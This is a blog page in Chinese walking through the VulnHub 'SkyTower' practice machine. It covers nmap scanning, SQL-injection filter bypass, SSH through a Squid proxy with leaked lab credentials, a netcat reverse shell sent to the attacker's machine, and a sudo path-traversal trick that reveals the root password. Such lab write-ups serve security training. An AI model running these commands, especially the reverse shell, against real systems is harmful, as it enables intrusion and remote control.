@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="forg12">
+    
+    <title>
+        
+            vulnhub-skytower |
+        
+        forg12&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"forg1222.github.io","root":"/","language":"zh-CN","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"https://forg1222.github.io/images/head.jpeg","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"https://forg1222.github.io/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"6.6.6"};
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+  </script>
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                forg12&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">vulnhub-skytower</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="https://forg1222.github.io/images/head.jpeg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">forg12</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2022-08-11 09:05:58</span>
+        <span class="mobile">2022-08-11 09:05</span>
+    </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/vulnhub/">vulnhub</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>815 字</span>
+        </span>
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h1><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.2.0/24</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) </span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.2.176</span><br><span class="line">Host is up (0.16s latency).</span><br></pre></td></tr></table></figure>
+
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">nmap -p-  192.168.2.176    </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org )</span><br><span class="line">Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan</span><br><span class="line">Connect Scan Timing: About 97.59% done; ETC: 14:01 (0:00:00 remaining)</span><br><span class="line">Nmap scan report for 192.168.2.176</span><br><span class="line">Host is up (0.044s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (conn-refused)</span><br><span class="line">PORT     STATE    SERVICE</span><br><span class="line">22/tcp   filtered ssh</span><br><span class="line">80/tcp   open     http</span><br><span class="line">3128/tcp open     squid-http</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="服务探针"><a href="#服务探针" class="headerlink" title="服务探针"></a>服务探针</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> nmap -p22,80,3128 -T5 -sV -A 192.168.2.176</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org )</span><br><span class="line">Nmap scan report for 192.168.2.176</span><br><span class="line">Host is up (0.0099s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE    SERVICE    VERSION</span><br><span class="line">22/tcp   filtered ssh</span><br><span class="line">80/tcp   open     http       Apache httpd 2.2.22 ((Debian))</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html).</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">3128/tcp open     http-proxy Squid http proxy 3.1.20</span><br><span class="line">|_http-title: ERROR: The requested URL could not be retrieved</span><br><span class="line">|_http-server-header: squid/3.1.20</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 32.55 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>​	80端口进来是一个登录页面，尝试查看是否存在注入。</p>
+<p><img src="/2022/08/11/vulnhub-skytower/image-20220817141404526.png" alt="image-20220817141404526"></p>
+<p><img src="/2022/08/11/vulnhub-skytower/image-20220817141306871.png" alt="image-20220817141306871"></p>
+<p>​	可以发现有报错信息，可能存在sql注入。</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>​	单引号报错，然后使用<code>and </code>,<code>or</code>试试。</p>
+<p><img src="/2022/08/11/vulnhub-skytower/image-20220817142138793.png" alt="image-20220817142138793"></p>
+<p>​	发现没起作用，多加个引号看看报错回显的信息。</p>
+<p><img src="/2022/08/11/vulnhub-skytower/image-20220817142253242.png" alt="image-20220817142253242"></p>
+<p>​	从回显大概可以看到这里<code>and </code>以及<code> =</code>都被过滤了，在关键字中间加上字母严重猜想。</p>
+<p><img src="/2022/08/11/vulnhub-skytower/image-20220817142526649.png" alt="image-20220817142526649"></p>
+<p>​	试试关键字复写。</p>
+<p><img src="/2022/08/11/vulnhub-skytower/image-20220817142621621.png" alt="image-20220817142621621"></p>
+<p>​	也不行，使用运算符试试。</p>
+<p><img src="/2022/08/11/vulnhub-skytower/image-20220817142726150.png" alt="image-20220817142726150"></p>
+<p>​	尝试成功，返回的结果通过。</p>
+<p><img src="/2022/08/11/vulnhub-skytower/image-20220817143126560.png" alt="image-20220817143126560"></p>
+<p>翻译：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">欢迎 john@skytech.com</span><br><span class="line"></span><br><span class="line">如您所知，SkyTech 已停止所有国际业务。</span><br><span class="line"></span><br><span class="line">对于我们所有的长期员工，我们希望对您的奉献和辛勤工作表示感谢。</span><br><span class="line"></span><br><span class="line">不幸的是，包括您在内的所有国际合同都已终止。</span><br><span class="line"></span><br><span class="line">您的剩余合同和退休基金 2 美元已全额支付到安全账户。 出于安全原因，您必须通过 SSH 登录 SkyTech 服务器才能访问帐户详细信息。</span><br><span class="line"></span><br><span class="line">用户名: john</span><br><span class="line">密码: hereisjohn</span><br><span class="line"></span><br><span class="line">我们祝您在未来的工作中好运。</span><br></pre></td></tr></table></figure>
+
+<p>​	得到ssh登录账号密码，结果发现连接超时，结合前面端口探针拿到的代理端口，使用代理端口再尝试登录。这里使用proxychains。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http    192.168.2.176 3128</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains ssh john@192.168.2.176</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/11/vulnhub-skytower/image-20220817143556735.png" alt="image-20220817143556735"></p>
+<p><img src="/2022/08/11/vulnhub-skytower/image-20220817143655240.png" alt="image-20220817143655240"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Funds have been withdrawn</span><br><span class="line">资金已被提取</span><br></pre></td></tr></table></figure>
+
+<p>​	这里刚登录上就被关闭了，然后提示资金已被提取后就被断开，所以这里需要直接登录时通过nc反弹shell。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains ssh john@192.168.2.176 nc 192.168.2.177 2233 -e /bin/bash</span><br><span class="line"></span><br><span class="line">nc -lvnp 2233</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/11/vulnhub-skytower/image-20220817144455008.png" alt="image-20220817144455008"></p>
+<p><img src="/2022/08/11/vulnhub-skytower/image-20220817144440393.png" alt="image-20220817144440393"></p>
+<p>​	</p>
+<p>​	或者利用另外一种方式，删除<code>.bashrc</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains ssh john@192.168.2.176 mv .bashrc .bashrc.bak  </span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2022/08/11/vulnhub-skytower/image-20220817153051915.png" alt="image-20220817153051915"></p>
+<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="mysql信息收集"><a href="#mysql信息收集" class="headerlink" title="mysql信息收集"></a>mysql信息收集</h2><p>​	因为用msf提取没有成功，这里想进数据库收集点信息。</p>
+<p><img src="/2022/08/11/vulnhub-skytower/image-20220817152648699.png" alt="image-20220817152648699"></p>
+<p><img src="/2022/08/11/vulnhub-skytower/image-20220817153511211.png" alt="image-20220817153511211"></p>
+<h2 id="sara-ssh登录"><a href="#sara-ssh登录" class="headerlink" title="sara ssh登录"></a>sara ssh登录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sara</span><br><span class="line">ihatethisjob </span><br></pre></td></tr></table></figure>
+
+<p>​	尝试了之后发现sara的密码和ssh登录密码也是一致的，然后通过sudo -l看到该用户可以以root权限使用<code>cat</code>和<code>ls</code>命令查看&#x2F;accounts下的所有文件。</p>
+<p><img src="/2022/08/11/vulnhub-skytower/image-20220817153953752.png" alt="image-20220817153953752"></p>
+<h2 id="x2F-绕过"><a href="#x2F-绕过" class="headerlink" title="..&#x2F;绕过"></a>..&#x2F;绕过</h2><p>​	通过<code>../</code>来跳过只查看accounts文件夹限制，然后拿到了root用户的密码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sara@SkyTower:~$ sudo ls /accounts/../root/</span><br><span class="line">flag.txt</span><br><span class="line"></span><br><span class="line">sara@SkyTower:~$ sudo cat /accounts/../root/flag.txt</span><br><span class="line">Congratz, have a cold one to celebrate!</span><br><span class="line">root password is theskytower</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/08/11/vulnhub-skytower/image-20220817154421885.png" alt="image-20220817154421885"></p>
+<p><img src="/2022/08/11/vulnhub-skytower/image-20220817154650340.png" alt="image-20220817154650340"></p>
+
+        </div>
+
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/vulnhub/">#vulnhub</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2022/08/12/vulnhub-sickos1-1/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">vulnhub-sickos1.1</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2022/08/10/vulnhub-stapler/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">vulnhub-stapler</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>
+              -
+            
+            2023&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">forg12</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v6.6.6</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A6%82%E8%A6%81"><span class="nav-number">1.</span> <span class="nav-text">概要</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="nav-number">2.1.</span> <span class="nav-text">主机发现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">2.2.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E6%8E%A2%E9%92%88"><span class="nav-number">2.3.</span> <span class="nav-text">服务探针</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#80"><span class="nav-number">2.4.</span> <span class="nav-text">80</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-number">3.1.</span> <span class="nav-text">sql注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="nav-number">4.</span> <span class="nav-text">权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">4.1.</span> <span class="nav-text">mysql信息收集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sara-ssh%E7%99%BB%E5%BD%95"><span class="nav-number">4.2.</span> <span class="nav-text">sara ssh登录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#x2F-%E7%BB%95%E8%BF%87"><span class="nav-number">4.3.</span> <span class="nav-text">..&#x2F;绕过</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
